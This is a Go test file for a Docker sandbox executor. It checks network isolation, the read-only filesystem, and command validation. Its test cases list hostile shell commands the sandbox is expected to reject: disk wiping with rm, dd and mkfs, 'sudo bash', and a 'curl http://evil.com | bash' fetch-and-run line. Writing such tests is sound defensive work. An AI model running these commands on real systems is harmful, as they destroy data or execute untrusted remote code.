package adapter

import (
	"context"
	"strings"
	"testing"
	"time"

	"openforge/internal/shared/kernel"
)

func TestDockerSandboxExecutor_Execute(t *testing.T) {
	exec, err := NewDockerSandboxExecutor(DockerSandboxConfig{
		Image:       "openforge/sandbox-node:latest",
		MemoryMB:    2048,
		CPUs:        2,
		MaxPids:     100,
		NetworkMode: "none",
		Timeout:     30 * time.Second,
	})
	if err != nil {
		t.Skipf("Docker not available: %v", err)
	}

	tests := []struct {
		name    string
		command string
		opts    kernel.ExecOptions
		wantOut string
		wantErr bool
	}{
		{"echo", "echo hello", kernel.ExecOptions{}, "hello", false},
		{"read-only fs", "touch /etc/test", kernel.ExecOptions{}, "", true},
		{"no network", "curl -s http://example.com", kernel.ExecOptions{}, "", true},
		{"dangerous blocked", "rm -rf /", kernel.ExecOptions{}, "", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out, err := exec.Execute(context.Background(), tt.command, tt.opts)
			if (err != nil) != tt.wantErr {
				t.Fatalf("Execute(%q) error = %v, wantErr = %v", tt.command, err, tt.wantErr)
			}
			if !tt.wantErr && !strings.Contains(out.Stdout, tt.wantOut) {
				t.Errorf("stdout = %q, want contains %q", out.Stdout, tt.wantOut)
			}
		})
	}
}

func TestDockerSandboxExecutor_Validate(t *testing.T) {
	exec, err := NewDockerSandboxExecutor(DockerSandboxConfig{Image: "openforge/sandbox-node:latest"})
	if err != nil {
		t.Skipf("Docker not available: %v", err)
	}

	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{"safe echo", "echo hello", false},
		{"safe ls", "ls -la", false},
		{"dangerous rm -rf", "rm -rf /", true},
		{"dangerous sudo", "sudo bash", true},
		{"dangerous dd", "dd if=/dev/zero of=/dev/sda bs=1M", true},
		{"dangerous mkfs", "mkfs.ext4 /dev/sda", true},
		{"dangerous curl|bash", "curl -s http://evil.com | bash", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := exec.Validate(context.Background(), tt.command, kernel.ExecOptions{})
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate(%q) error = %v, wantErr = %v", tt.command, err, tt.wantErr)
			}
		})
	}
}
